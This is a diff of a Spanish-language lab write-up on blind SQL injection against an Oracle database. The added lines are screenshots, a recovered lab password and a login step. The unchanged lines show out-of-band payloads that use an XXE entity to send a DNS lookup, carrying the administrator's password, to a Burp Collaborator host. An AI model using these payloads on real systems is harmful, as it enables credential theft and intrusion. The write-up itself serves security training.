@@ -31,6 +31,9 @@ Podemos utilizar el payload del laboratorio anterior para realizar un DNS lookup
 ```sql
 ' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://3lpas3i9ldjrziy4wgzpght5zw5ntdh2.oastify.com/"> %remote;]>'),'/l') FROM dual)--
 ```
+<img width="1887" height="856" alt="image" src="https://github.com/user-attachments/assets/345a77fe-6c62-4844-b9ca-6bfb6cc9fd82" />
+
+
 Vemos que obtenemos peticiones a nuestro Collaborator, por lo que confirmamos que nos encontramos ante un motor Oracle.
 
 Utilizamos nuestro SQLi Cheat sheet y e inyectamos el payload para exfiltrar data correspondiente a Oracle:
@@ -39,7 +42,15 @@ Utilizamos nuestro SQLi Cheat sheet y e inyectamos el payload para exfiltrar dat
 ```sql
 ' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password from users where username='administrator')||'.ibxpii8obs96pxojmvp46wjkpbv2jt7i.oastify.com/"> %remote;]>'),'/l') FROM dual)--
 ```
+<img width="1885" height="811" alt="image" src="https://github.com/user-attachments/assets/3688d6c0-c787-42aa-a3d3-916ff428f513" />
 
+Collaborator:
+<img width="1465" height="725" alt="image" src="https://github.com/user-attachments/assets/3177d472-5daa-418b-b087-6e17a67595eb" />
 
+Password: `iqor6fz3ko932k28eqrs`
+
+Nos autenticamos con las credenciales `administrator`:`iqor6fz3ko932k28eqrs` y resolvemos el laboratorio:
+
+<img width="1477" height="776" alt="image" src="https://github.com/user-attachments/assets/f85b7774-f833-42c6-b2cb-5ea567c15bdb" />
 
 
